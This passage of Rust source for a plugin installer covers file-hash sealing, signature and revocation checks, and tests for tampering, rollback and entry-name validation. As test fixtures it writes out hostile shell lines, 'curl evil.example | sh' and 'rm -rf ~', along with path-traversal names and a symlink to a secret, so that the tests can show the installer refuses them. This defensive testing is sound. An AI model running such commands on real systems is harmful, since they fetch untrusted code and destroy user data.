/// not a plain file or directory — a symlink in a package could point at a
/// secret outside it, and copying would follow it into the plugin's reach.
/// `skip_data` leaves out a top-level `data/` folder (an installed plugin's own state).
fn collect_payload(
    dir: &Path,
    skip_data: bool,
) -> Result<BTreeMap<String, String>, LifecycleError> {
    fn walk(
        root: &Path,
        cur: &Path,
        skip_data: bool,
        out: &mut BTreeMap<String, String>,
    ) -> Result<(), LifecycleError> {
        for entry in fs::read_dir(cur)? {
            let entry = entry?;
            let ty = entry.file_type()?;
            let path = entry.path();
            let rel = path
                .strip_prefix(root)
                .map_err(|_| LifecycleError::Manifest("path escaped the package".into()))?
                .to_string_lossy()
                .to_string();
            if cur == root && META_FILES.contains(&rel.as_str()) {
                continue;
            }
            if skip_data && cur == root && rel == "data" {
                continue;
            }
            if ty.is_symlink() || !(ty.is_file() || ty.is_dir()) {
                return Err(LifecycleError::Manifest(format!(
                    "package contains a symlink or special file: {rel}"
                )));
            }
            if ty.is_dir() {
                walk(root, &path, skip_data, out)?;
            } else {
                out.insert(rel, hash_file(&path)?);
            }
        }
        Ok(())
    }
    let mut out = BTreeMap::new();
    walk(dir, dir, skip_data, &mut out)?;
    Ok(out)
}

/// Compute the payload hashes of a package directory and write them into its
/// `manifest.json`. Call this immediately before signing: the signature then
/// covers the binary, not only the description of it.
pub fn seal_package_files(pkg: &Path) -> Result<(), LifecycleError> {
    let path = pkg.join("manifest.json");
    let mut value: serde_json::Value = serde_json::from_slice(
        &fs::read(&path).map_err(|_| LifecycleError::Manifest("manifest.json missing".into()))?,
    )
    .map_err(|e| LifecycleError::Manifest(e.to_string()))?;
    let files = collect_payload(pkg, false)?;
    value["files"] =
        serde_json::to_value(&files).map_err(|e| LifecycleError::Manifest(e.to_string()))?;
    fs::write(
        &path,
        serde_json::to_vec(&value).map_err(|e| LifecycleError::Manifest(e.to_string()))?,
    )?;
    Ok(())
}

/// Check a package or installed directory against its manifest.
///
/// - the entry name is a single safe component and the entry file exists;
/// - nothing in the directory is a symlink or special file;
/// - when `require_hashes` (the package was signed): the manifest lists the
///   payload, the entry is in the list, every file matches its hash, and there
///   are no files the manifest does not list.
fn verify_payload(
    dir: &Path,
    manifest: &PluginManifestLite,
    require_hashes: bool,
    skip_data: bool,
) -> Result<(), LifecycleError> {
    let entry = if manifest.runtime == "wasm" {
        "plugin.wasm"
    } else {
        manifest.entry.as_str()
    };
    if !valid_entry_name(entry) {
        return Err(LifecycleError::Manifest(format!(
            "entry {entry:?} is not a plain file name"
        )));
    }
    if !dir.join(entry).is_file() {
        return Err(LifecycleError::MissingEntry(entry.to_string()));
    }
    let actual = collect_payload(dir, skip_data)?;
    if !require_hashes && manifest.files.is_empty() {
        return Ok(());
    }
    if manifest.files.is_empty() {
        return Err(LifecycleError::Signature(
            "a signed manifest must list the hash of every payload file".into(),
        ));
    }
    if !manifest.files.contains_key(entry) {
        return Err(LifecycleError::Signature(format!(
            "entry {entry:?} is not covered by the signed file list"
        )));
    }
    for (name, want) in &manifest.files {
        match actual.get(name) {
            None => {
                return Err(LifecycleError::Signature(format!(
                    "signed file {name:?} is missing from the package"
                )))
            }
            Some(have) if have != want => {
                return Err(LifecycleError::Signature(format!(
                    "{name:?} does not match its signed hash (the file was changed after signing)"
                )))
            }
            Some(_) => {}
        }
    }
    if let Some(extra) = actual.keys().find(|k| !manifest.files.contains_key(*k)) {
        return Err(LifecycleError::Signature(format!(
            "{extra:?} is in the package but not in the signed file list"
        )));
    }
    Ok(())
}

fn copy_dir_all(src: &Path, dst: &Path) -> std::io::Result<()> {
    fs::create_dir_all(dst)?;
    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let ty = entry.file_type()?;
        let to = dst.join(entry.file_name());
        if ty.is_symlink() || !(ty.is_dir() || ty.is_file()) {
            return Err(std::io::Error::other(format!(
                "package contains a symlink or special file: {}",
                entry.path().display()
            )));
        }
        if ty.is_dir() {
            copy_dir_all(&entry.path(), &to)?;
        } else {
            fs::copy(entry.path(), &to)?;
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use ed25519_dalek::{Signer, SigningKey};

    #[test]
    fn local_hosts_a_plugin_declares_but_the_owner_has_not_granted_are_named() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let dir = mgr.plugins_dir().join("org.test.local");
        fs::create_dir_all(&dir).unwrap();
        fs::write(
            dir.join("manifest.json"),
            br#"{"id":"org.test.local","version":"1.0.0","name":"L","permissions":{
                "network_hosts":["api.example.com","127.0.0.1:3001","127.0.0.1:5055","localhost:9","10.1.2.3","[::1]:80"]}}"#,
        )
        .unwrap();
        let mut granted = BTreeMap::new();
        let all = mgr.ungranted_private_hosts("org.test.local", &granted);
        assert_eq!(all, ["127.0.0.1:3001", "127.0.0.1:5055", "localhost:9", "10.1.2.3", "[::1]:80"]);
        granted.insert("org.test.local".to_string(), vec!["127.0.0.1:3001".to_string()]);
        let rest = mgr.ungranted_private_hosts("org.test.local", &granted);
        assert!(!rest.contains(&"127.0.0.1:3001".to_string()) && rest.len() == 4, "{rest:?}");
        // A grant to another plugin is no grant for this one, and an unknown plugin has nothing.
        let other = BTreeMap::from([("org.other".to_string(), vec!["127.0.0.1:3001".to_string()])]);
        assert_eq!(mgr.ungranted_private_hosts("org.test.local", &other).len(), 5);
        assert!(mgr.ungranted_private_hosts("org.test.nope", &granted).is_empty());
    }

    #[test]
    fn only_loopback_private_and_localhost_count_as_local_hosts() {
        for h in ["127.0.0.1", "127.0.0.1:3001", "localhost", "LOCALHOST:80", "192.168.1.5:22", "10.0.0.1", "[::1]:8080"] {
            assert!(declared_host_is_private(h), "{h}");
        }
        for h in ["api.example.com", "api.example.com:443", "8.8.8.8", "1.1.1.1:53", "coarena.ai"] {
            assert!(!declared_host_is_private(h), "{h}");
        }
    }

    fn make_pkg(dir: &Path, id: &str, version: &str, sign: bool) -> PathBuf {
        let pkg = dir.join(format!("pkg-{id}-{version}"));
        fs::create_dir_all(&pkg).unwrap();
        let manifest = PluginManifestLite {
            id: id.into(),
            version: version.into(),
            name: format!("Plugin {id}"),
            description: String::new(),
            runtime: "process".into(),
            entry: "plugin".into(),
            migrations: vec![Migration {
                version: 1,
                description: "init".into(),
                sql: "CREATE TABLE t (id INTEGER PRIMARY KEY)".into(),
            }],
            permissions_summary: vec!["capability: fs.read".into(), "host: api.example.com".into()],
            entitlement_account: None,
            files: Default::default(),
            permissions: None,
        };
        let bytes = serde_json::to_vec(&manifest).unwrap();
        fs::write(pkg.join("manifest.json"), &bytes).unwrap();
        // Entry binary (fake content is fine — it's data for lifecycle tests).
        let entry = pkg.join("plugin");
        fs::write(&entry, b"#!/bin/sh\nexit 0\n").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(&entry, fs::Permissions::from_mode(0o755)).unwrap();
        }
        if sign {
            seal_package_files(&pkg).unwrap();
            let bytes = fs::read(pkg.join("manifest.json")).unwrap();
            let seed = [7u8; 32];
            let sk = SigningKey::from_bytes(&seed);
            let sig = sk.sign(&bytes);
            fs::write(pkg.join("signature.bin"), sig.to_bytes()).unwrap();
            let vk = sk.verifying_key();
            fs::write(pkg.join("signer.pub"), hex::encode(vk.to_bytes())).unwrap();
        }
        pkg
    }

    fn signer_hex() -> String {
        let sk = SigningKey::from_bytes(&[7u8; 32]);
        hex::encode(sk.verifying_key().to_bytes())
    }

    #[test]
    fn install_unsigned_dev_mode_and_permissions_display() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let pkg = make_pkg(src.path(), "org.test.dev", "0.1.0", false);
        let opts = InstallOptions {
            require_signature: false,
            trusted_keys: vec![],
            dev_mode: true,
        };
        let report = mgr.install(&pkg, &opts).unwrap();
        assert_eq!(report.action, "install");
        assert!(!report.signed);
        assert_eq!(report.permissions.len(), 2);
        assert_eq!(report.migrations_run, vec![1]);
        assert!(mgr.install_dir("org.test.dev").join("plugin").exists());
        assert!(mgr.list().contains(&"org.test.dev".to_string()));
    }

    #[test]
    fn signature_required_and_verified() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let pkg = make_pkg(src.path(), "org.test.signed", "1.0.0", true);
        // Unsigned pkg rejected when required.
        let unsigned = make_pkg(src.path(), "org.test.unsigned", "1.0.0", false);
        let opts = InstallOptions {
            require_signature: true,
            trusted_keys: vec![signer_hex()],
            dev_mode: false,
        };
        assert!(matches!(
            mgr.install(&unsigned, &opts),
            Err(LifecycleError::Signature(_))
        ));
        // Signed pkg accepted.
        let report = mgr.install(&pkg, &opts).unwrap();
        assert!(report.signed);
        assert_eq!(report.signer.as_deref(), Some(signer_hex().as_str()));
    }

    #[test]
    fn revoked_signer_is_refused() {
        let home = tempfile::tempdir().unwrap();
        fs::write(
            home.path().join("revoked-signers"),
            format!("{}\n", signer_hex()),
        )
        .unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let pkg = make_pkg(src.path(), "org.test.revoked", "1.0.0", true);
        let opts = InstallOptions {
            require_signature: true,
            trusted_keys: vec![signer_hex()],
            dev_mode: false,
        };
        assert!(matches!(
            mgr.install(&pkg, &opts),
            Err(LifecycleError::Revoked(_))
        ));
    }

    #[test]
    fn staged_update_then_rollback_restores_previous() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let opts = InstallOptions {
            require_signature: false,
            trusted_keys: vec![],
            dev_mode: true,
        };
        let pkg_v1 = make_pkg(src.path(), "org.test.upd", "1.0.0", false);
        mgr.install(&pkg_v1, &opts).unwrap();
        // v2 package: same id, new version, extra migration.
        let pkg_v2 = src.path().join("pkg-v2");
        fs::create_dir_all(&pkg_v2).unwrap();
        let manifest = PluginManifestLite {
            id: "org.test.upd".into(),
            version: "2.0.0".into(),
            name: "Plugin upd".into(),
            description: String::new(),
            runtime: "process".into(),
            entry: "plugin".into(),
            migrations: vec![
                Migration {
                    version: 1,
                    description: "init".into(),
                    sql: "CREATE TABLE t (id INTEGER PRIMARY KEY)".into(),
                },
                Migration {
                    version: 2,
                    description: "v2".into(),
                    sql: "ALTER TABLE t ADD COLUMN x TEXT".into(),
                },
            ],
            permissions_summary: vec![],
            entitlement_account: None,
            files: Default::default(),
            permissions: None,
        };
        fs::write(
            pkg_v2.join("manifest.json"),
            serde_json::to_vec(&manifest).unwrap(),
        )
        .unwrap();
        fs::write(pkg_v2.join("plugin"), b"#!/bin/sh\nexit 0\n").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(pkg_v2.join("plugin"), fs::Permissions::from_mode(0o755)).unwrap();
        }
        let report = mgr.update(&pkg_v2, &opts).unwrap();
        assert_eq!(report.action, "update");
        assert_eq!(report.migrations_run, vec![2]); // v1 already applied
                                                    // Binary is v2 content-wise (same bytes here; version in manifest).
        let m: PluginManifestLite = serde_json::from_slice(
            &fs::read(mgr.install_dir("org.test.upd").join("manifest.json")).unwrap(),
        )
        .unwrap();
        assert_eq!(m.version, "2.0.0");
        // Rollback restores v1 binary dir.
        mgr.rollback("org.test.upd").unwrap();
        let m: PluginManifestLite = serde_json::from_slice(
            &fs::read(mgr.install_dir("org.test.upd").join("manifest.json")).unwrap(),
        )
        .unwrap();
        assert_eq!(m.version, "1.0.0");
    }

    #[test]
    fn three_crashes_in_an_hour_quarantine() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let pkg = make_pkg(src.path(), "org.test.crash", "1.0.0", false);
        let opts = InstallOptions {
            require_signature: false,
            trusted_keys: vec![],
            dev_mode: true,
        };
        mgr.install(&pkg, &opts).unwrap();
        assert!(mgr.launch_permitted("org.test.crash").is_ok());
        assert_eq!(mgr.record_crash("org.test.crash").unwrap(), 1);
        assert_eq!(mgr.record_crash("org.test.crash").unwrap(), 2);
        assert_eq!(mgr.record_crash("org.test.crash").unwrap(), 3);
        assert!(matches!(
            mgr.launch_permitted("org.test.crash"),
            Err(LifecycleError::Quarantined(_, 3))
        ));
    }

    #[test]
    fn uninstall_removes_all_dirs() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let pkg = make_pkg(src.path(), "org.test.rm", "1.0.0", false);
        let opts = InstallOptions {
            require_signature: false,
            trusted_keys: vec![],
            dev_mode: true,
        };
        mgr.install(&pkg, &opts).unwrap();
        mgr.uninstall("org.test.rm").unwrap();
        assert!(mgr.list().is_empty());
        assert!(!mgr.install_dir("org.test.rm").exists());
    }

    #[test]
    fn dev_mode_install_emits_loud_audit_events() {
        let home = tempfile::tempdir().unwrap();
        let mut mgr = PluginManager::new(home.path());
        let audit = Arc::new(AuditLog::new());
        mgr.set_audit_log(audit.clone());
        let src = tempfile::tempdir().unwrap();
        let pkg = make_pkg(src.path(), "org.test.devaudit", "1.0.0", false);
        let opts = InstallOptions {
            require_signature: false,
            trusted_keys: vec![],
            dev_mode: true,
        };
        let report = mgr.install(&pkg, &opts).unwrap();
        assert!(report.dev_mode);
        assert!(!report.account_bound);
        // Main audit chain got a PluginLifecycle entry with the dotted kind.
        let entries = audit.recent(10);
        assert_eq!(entries.len(), 1);
        assert!(matches!(entries[0].action, AuditAction::PluginLifecycle));
        assert!(entries[0].detail.contains("plugin.dev_mode.install"));
        assert!(entries[0].detail.contains("org.test.devaudit"));
        // Per-plugin audit trail got the same kind.
        let storage = PluginStorage::open(home.path(), "org.test.devaudit").unwrap();
        let plugin_audit = storage.audit_tail(50).unwrap();
        assert!(plugin_audit
            .iter()
            .any(|(_, action, _)| action == "plugin.dev_mode.install"));
    }

    #[test]
    fn non_dev_install_emits_no_dev_mode_audit() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        // A production install: signed by a trusted key, no developer mode.
        let pkg = make_pkg(src.path(), "org.test.nodev", "1.0.0", true);
        let report = mgr.install(&pkg, &trusted()).unwrap();
        assert!(!report.dev_mode);
        let storage = PluginStorage::open(home.path(), "org.test.nodev").unwrap();
        let plugin_audit = storage.audit_tail(50).unwrap();
        assert!(!plugin_audit
            .iter()
            .any(|(_, action, _)| action.starts_with("plugin.dev_mode")));
    }

    fn make_bound_pkg(dir: &Path, id: &str, entitlement: &str, sign: bool) -> PathBuf {
        let pkg = dir.join(format!("pkg-{id}-bound"));
        fs::create_dir_all(&pkg).unwrap();
        let manifest = PluginManifestLite {
            id: id.into(),
            version: "1.0.0".into(),
            name: format!("Bound {id}"),
            description: String::new(),
            runtime: "process".into(),
            entry: "plugin".into(),
            migrations: vec![],
            permissions_summary: vec![],
            entitlement_account: Some(entitlement.into()),
            files: Default::default(),
            permissions: None,
        };
        let bytes = serde_json::to_vec(&manifest).unwrap();
        fs::write(pkg.join("manifest.json"), &bytes).unwrap();
        let entry = pkg.join("plugin");
        fs::write(&entry, b"#!/bin/sh\nexit 0\n").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(&entry, fs::Permissions::from_mode(0o755)).unwrap();
        }
        if sign {
            seal_package_files(&pkg).unwrap();
            let bytes = fs::read(pkg.join("manifest.json")).unwrap();
            let sk = SigningKey::from_bytes(&[9u8; 32]);
            let sig = sk.sign(&bytes);
            fs::write(pkg.join("signature.bin"), sig.to_bytes()).unwrap();
            fs::write(
                pkg.join("signer.pub"),
                hex::encode(sk.verifying_key().to_bytes()),
            )
            .unwrap();
        }
        pkg
    }

    #[test]
    fn entitlement_account_match_installs_mismatch_refuses() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let local_fp = local_plugin_account_fingerprint(home.path()).unwrap();
        // Matching fingerprint → install succeeds and is flagged account_bound.
        let good = make_bound_pkg(src.path(), "org.test.bound", &local_fp, true);
        let trusted = {
            let sk = SigningKey::from_bytes(&[9u8; 32]);
            hex::encode(sk.verifying_key().to_bytes())
        };
        let opts = InstallOptions {
            require_signature: true,
            trusted_keys: vec![trusted],
            dev_mode: false,
        };
        let report = mgr.install(&good, &opts).unwrap();
        assert!(report.account_bound);
        assert!(report.signed);
        // Mismatched fingerprint → refused even with a valid signature.
        let bad = make_bound_pkg(
            src.path(),
            "org.test.wrongacct",
            "0000000000000000000000000000000000000000000000000000000000000000",
            true,
        );
        assert!(matches!(
            mgr.install(&bad, &opts),
            Err(LifecycleError::AccountBinding)
        ));
        // Binding is enforced in dev mode too (unsigned package, wrong account).
        let bad_dev = make_bound_pkg(
            src.path(),
            "org.test.wrongacct2",
            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
            false,
        );
        let dev_opts = InstallOptions {
            require_signature: false,
            trusted_keys: vec![],
            dev_mode: true,
        };
        assert!(matches!(
            mgr.install(&bad_dev, &dev_opts),
            Err(LifecycleError::AccountBinding)
        ));
        // Fingerprint is stable across calls and never equals the raw key.
        assert_eq!(
            local_plugin_account_fingerprint(home.path()).unwrap(),
            local_fp
        );
        assert_ne!(local_fp.len(), 32); // hex sha256, not raw key bytes
    }

    #[test]
    fn dev_mode_banner_is_loud_and_centralized() {
        assert!(DEV_MODE_WARNING.contains("DEV MODE"));
        assert!(DEV_MODE_WARNING.contains("NOT safe for production"));
        assert!(DEV_MODE_BOOT_WARNING.contains("PLUGIN DEV MODE ENABLED"));
        let b = dev_mode_banner("install", "org.x", "1.0.0", false);
        assert!(b.contains("UNSIGNED plugin org.x"));
        assert!(b.contains("DEV MODE"));
    }

    // ---- the signature covers the binary ------------------------------------------------------------
    fn trusted() -> InstallOptions {
        InstallOptions {
            require_signature: true,
            trusted_keys: vec![signer_hex()],
            dev_mode: false,
        }
    }

    fn resign(pkg: &Path) {
        // Re-sign (without re-sealing) so the signature is valid for whatever manifest.json holds.
        let sk = SigningKey::from_bytes(&[7u8; 32]);
        let bytes = fs::read(pkg.join("manifest.json")).unwrap();
        fs::write(pkg.join("signature.bin"), sk.sign(&bytes).to_bytes()).unwrap();
    }

    #[test]
    fn a_binary_swapped_after_signing_is_refused() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let pkg = make_pkg(src.path(), "org.test.swap", "1.0.0", true);
        // The manifest and signature are untouched; only the executable changes.
        fs::write(pkg.join("plugin"), b"#!/bin/sh\ncurl evil.example | sh\n").unwrap();
        let err = mgr.install(&pkg, &trusted()).unwrap_err();
        assert!(
            matches!(&err, LifecycleError::Signature(m) if m.contains("changed after signing")),
            "{err:?}"
        );
        assert!(mgr.list().is_empty(), "nothing may be installed");
        assert!(
            !mgr.plugins_dir().join("org.test.swap.staging").exists(),
            "staging is cleaned up"
        );
    }

    #[test]
    fn a_file_added_to_a_signed_package_is_refused() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let pkg = make_pkg(src.path(), "org.test.extra", "1.0.0", true);
        fs::write(pkg.join("backdoor.sh"), b"#!/bin/sh\n").unwrap();
        let err = mgr.install(&pkg, &trusted()).unwrap_err();
        assert!(
            matches!(&err, LifecycleError::Signature(m) if m.contains("not in the signed file list")),
            "{err:?}"
        );
    }

    #[test]
    fn a_signed_manifest_that_lists_no_files_is_refused() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let pkg = make_pkg(src.path(), "org.test.nolist", "1.0.0", true);
        let mut v: serde_json::Value =
            serde_json::from_slice(&fs::read(pkg.join("manifest.json")).unwrap()).unwrap();
        v["files"] = serde_json::json!({});
        fs::write(pkg.join("manifest.json"), serde_json::to_vec(&v).unwrap()).unwrap();
        resign(&pkg);
        let err = mgr.install(&pkg, &trusted()).unwrap_err();
        assert!(
            matches!(&err, LifecycleError::Signature(m) if m.contains("must list")),
            "{err:?}"
        );
    }

    #[test]
    fn a_self_signed_package_is_refused_when_no_signer_is_trusted() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        // Validly signed — by a key nobody configured. With an empty trust list the old
        // code accepted it, so anyone could ship a "signed" plugin.
        let pkg = make_pkg(src.path(), "org.test.selfsigned", "1.0.0", true);
        let err = mgr.install(&pkg, &InstallOptions::default()).unwrap_err();
        assert!(
            matches!(&err, LifecycleError::Signature(m) if m.contains("no trusted signers")),
            "{err:?}"
        );
        let other = InstallOptions {
            require_signature: true,
            trusted_keys: vec!["00".repeat(32)],
            dev_mode: false,
        };
        let err = mgr.install(&pkg, &other).unwrap_err();
        assert!(
            matches!(&err, LifecycleError::Signature(m) if m.contains("untrusted signer")),
            "{err:?}"
        );
    }

    #[test]
    fn unsigned_installs_need_developer_mode_whatever_require_signature_says() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let pkg = make_pkg(src.path(), "org.test.nosig", "1.0.0", false);
        let lax = InstallOptions {
            require_signature: false,
            trusted_keys: vec![],
            dev_mode: false,
        };
        assert!(matches!(
            mgr.install(&pkg, &lax),
            Err(LifecycleError::Signature(_))
        ));
    }

    #[test]
    fn symlinks_and_odd_entry_names_are_refused() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let dev = InstallOptions {
            require_signature: false,
            trusted_keys: vec![],
            dev_mode: true,
        };

        // A symlink to a file outside the package would copy a secret into the plugin's reach.
        let secret = src.path().join("vault.key");
        fs::write(&secret, "master-key").unwrap();
        let pkg = make_pkg(src.path(), "org.test.link", "1.0.0", false);
        std::os::unix::fs::symlink(&secret, pkg.join("notes.txt")).unwrap();
        let err = mgr.install(&pkg, &dev).unwrap_err();
        assert!(
            matches!(&err, LifecycleError::Manifest(m) if m.contains("symlink")),
            "{err:?}"
        );
        assert!(mgr.list().is_empty());

        for bad in [
            "../../bin/sh",
            "/bin/sh",
            "a/b",
            "..",
            "",
            "-rf",
            "manifest.json",
            "plugin\0",
        ] {
            assert!(!valid_entry_name(bad), "{bad:?}");
        }
        for good in ["plugin", "comms-plugin", "run.sh", "p_1"] {
            assert!(valid_entry_name(good), "{good:?}");
        }
        let pkg = make_pkg(src.path(), "org.test.entry", "1.0.0", false);
        let mut v: serde_json::Value =
            serde_json::from_slice(&fs::read(pkg.join("manifest.json")).unwrap()).unwrap();
        v["entry"] = serde_json::json!("../../../bin/sh");
        fs::write(pkg.join("manifest.json"), serde_json::to_vec(&v).unwrap()).unwrap();
        assert!(matches!(
            mgr.install(&pkg, &dev),
            Err(LifecycleError::Manifest(_))
        ));
    }

    #[test]
    fn a_failed_install_leaves_nothing_behind_and_can_be_retried() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let dev = InstallOptions {
            require_signature: false,
            trusted_keys: vec![],
            dev_mode: true,
        };
        let pkg = make_pkg(src.path(), "org.test.badmig", "1.0.0", false);
        let mut v: serde_json::Value =
            serde_json::from_slice(&fs::read(pkg.join("manifest.json")).unwrap()).unwrap();
        v["migrations"] =
            serde_json::json!([{"version": 1, "description": "broken", "sql": "THIS IS NOT SQL"}]);
        fs::write(pkg.join("manifest.json"), serde_json::to_vec(&v).unwrap()).unwrap();
        assert!(mgr.install(&pkg, &dev).is_err());
        assert!(
            mgr.list().is_empty(),
            "a plugin whose migration failed must not stay installed"
        );
        // The fixed package installs: no "already installed; use update" left behind.
        v["migrations"] = serde_json::json!([]);
        fs::write(pkg.join("manifest.json"), serde_json::to_vec(&v).unwrap()).unwrap();
        mgr.install(&pkg, &dev).unwrap();
    }

    // ---- launch-time verification -----------------------------------------------------------------------
    #[test]
    fn tampering_after_install_is_caught_at_launch() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let pkg = make_pkg(src.path(), "org.test.launch", "1.0.0", true);
        mgr.install(&pkg, &trusted()).unwrap();
        mgr.launch_permitted("org.test.launch")
            .expect("an untouched install may launch");
        // Another local process rewrites the installed binary.
        fs::write(
            home.path().join("plugins/org.test.launch/plugin"),
            b"#!/bin/sh\nrm -rf ~\n",
        )
        .unwrap();
        let err = mgr.launch_permitted("org.test.launch").unwrap_err();
        assert!(
            matches!(&err, LifecycleError::Signature(m) if m.contains("changed after signing")),
            "{err:?}"
        );
    }

    #[test]
    fn the_plugins_own_data_folder_does_not_trip_launch_verification() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let pkg = make_pkg(src.path(), "org.test.data", "1.0.0", true);
        mgr.install(&pkg, &trusted()).unwrap();
        fs::create_dir_all(home.path().join("plugins/org.test.data/data")).unwrap();
        fs::write(
            home.path().join("plugins/org.test.data/data/state.db"),
            "rows",
        )
        .unwrap();
        mgr.launch_permitted("org.test.data").unwrap();
    }

    #[test]
    fn a_signer_revoked_after_install_stops_the_plugin_at_the_next_launch() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let pkg = make_pkg(src.path(), "org.test.revoke-later", "1.0.0", true);
        mgr.install(&pkg, &trusted()).unwrap();
        mgr.launch_permitted("org.test.revoke-later").unwrap();
        fs::write(
            home.path().join("revoked-signers"),
            format!("{}\n", signer_hex()),
        )
        .unwrap();
        assert!(matches!(
            mgr.launch_permitted("org.test.revoke-later"),
            Err(LifecycleError::Revoked(_))
        ));
    }

    // ---- rollback never destroys data -----------------------------------------------------------------------
    fn write_marker_db(home: &Path, id: &str, text: &str) {
        let db = home.join("plugins").join(id).join("data").join("note.txt");
        fs::create_dir_all(db.parent().unwrap()).unwrap();
        fs::write(db, text).unwrap();
    }

    #[test]
    fn rollback_keeps_the_data_written_since_the_update() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let dev = InstallOptions {
            require_signature: false,
            trusted_keys: vec![],
            dev_mode: true,
        };
        let v1 = make_pkg(src.path(), "org.test.rb", "1.0.0", false);
        mgr.install(&v1, &dev).unwrap();
        // v2 changes the schema, so the update takes a pre-migration snapshot.
        let v2 = make_pkg(src.path(), "org.test.rb2", "2.0.0", false);
        let mut m: serde_json::Value =
            serde_json::from_slice(&fs::read(v2.join("manifest.json")).unwrap()).unwrap();
        m["id"] = serde_json::json!("org.test.rb");
        m["migrations"] = serde_json::json!([{"version": 1, "description": "init", "sql": "CREATE TABLE t (id INTEGER PRIMARY KEY)"}, {"version": 2, "description": "more", "sql": "CREATE TABLE u (id INTEGER PRIMARY KEY)"}]);
        fs::write(v2.join("manifest.json"), serde_json::to_vec(&m).unwrap()).unwrap();
        mgr.update(&v2, &dev).unwrap();
        // The new version writes data, then the owner rolls back.
        let db = home.path().join("plugins/org.test.rb/data/plugin.db");
        let conn = rusqlite::Connection::open(&db).unwrap();
        conn.execute("INSERT INTO t (id) VALUES (42)", []).unwrap();
        drop(conn);
        mgr.rollback("org.test.rb").unwrap();
        // The data written since the update is moved aside, never deleted.
        let aside: Vec<_> = fs::read_dir(home.path().join("plugins/org.test.rb/data/snapshots"))
            .unwrap()
            .flatten()
            .filter(|e| e.file_name().to_string_lossy().starts_with("pre-rollback-"))
            .collect();
        assert_eq!(aside.len(), 1, "the pre-rollback database must be kept");
        let kept = rusqlite::Connection::open(aside[0].path()).unwrap();
        let n: i64 = kept
            .query_row("SELECT COUNT(*) FROM t WHERE id = 42", [], |r| r.get(0))
            .unwrap();
        assert_eq!(
            n, 1,
            "the row written after the update survives in the kept copy"
        );
    }

    #[test]
    fn rollback_after_an_update_with_no_migration_does_not_restore_an_old_snapshot() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let dev = InstallOptions {
            require_signature: false,
            trusted_keys: vec![],
            dev_mode: true,
        };
        let v1 = make_pkg(src.path(), "org.test.rbn", "1.0.0", false);
        mgr.install(&v1, &dev).unwrap();
        write_marker_db(home.path(), "org.test.rbn", "state");
        // An older snapshot exists in the folder (from some earlier schema change).
        let snaps = home.path().join("plugins/org.test.rbn/data/snapshots");
        fs::create_dir_all(&snaps).unwrap();
        fs::write(snaps.join("pre-migration-1.db"), "OLD DATA").unwrap();
        let db = home.path().join("plugins/org.test.rbn/data/plugin.db");
        // v2 has the same migrations: the update runs none.
        let v2 = make_pkg(src.path(), "org.test.rbn-v2", "2.0.0", false);
        let mut m: serde_json::Value =
            serde_json::from_slice(&fs::read(v2.join("manifest.json")).unwrap()).unwrap();
        m["id"] = serde_json::json!("org.test.rbn");
        fs::write(v2.join("manifest.json"), serde_json::to_vec(&m).unwrap()).unwrap();
        mgr.update(&v2, &dev).unwrap();
        mgr.rollback("org.test.rbn").unwrap();
        // (The file legitimately changes - audit rows are written - so check what it is, not its bytes.)
        assert_ne!(
            fs::read(&db).unwrap(),
            b"OLD DATA",
            "an unrelated old snapshot must not replace the database"
        );
        let conn = rusqlite::Connection::open(&db).unwrap();
        let tables: i64 = conn
            .query_row(
                "SELECT COUNT(*) FROM sqlite_master WHERE name = 't'",
                [],
                |r| r.get(0),
            )
            .unwrap();
        assert_eq!(tables, 1, "the database still has the schema v1 created");
    }

    #[test]
    fn leftover_working_folders_are_not_listed_as_plugins() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
